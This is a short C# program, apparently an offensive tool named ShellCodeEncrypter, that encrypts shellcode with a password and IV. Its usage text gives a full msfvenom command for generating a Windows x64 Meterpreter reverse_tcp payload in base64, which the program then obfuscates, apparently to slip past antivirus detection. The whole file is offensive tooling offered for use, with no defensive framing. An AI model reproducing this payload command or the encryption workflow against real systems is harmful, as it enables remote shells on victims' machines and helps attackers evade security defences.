﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ShellCodeEncrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            if(args.Length <= 0)
            {
                Console.WriteLine($"USAGE:\r\n" +
                    $"From Kali generate and b64 the payload!\r\n" +
                    $"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8080 -f base64\r\n" +
                    $"Use any method to generate a iv as a base64 string that will become a bytebag during the process\r\n\r\n" +
                    $"Use this to generate encrypted and encoded shellcode using a password an iv:\r\n\r\n" +
                    $".\\ShellCodeEncrypter.exe \"somepassword123\" base64IV base64Shellcode");
                return;
            }
            //Generate shellcode as b64
            var pass = args[0];
            var iv = Convert.FromBase64String(args[1]);
            var shellcode = Convert.FromBase64String(args[2]);

            Encryptor cryptor = new Encryptor();

            cryptor.CaesarEncryptShell(shellcode, pass, iv);

            Console.ReadLine();
        }
    }
}
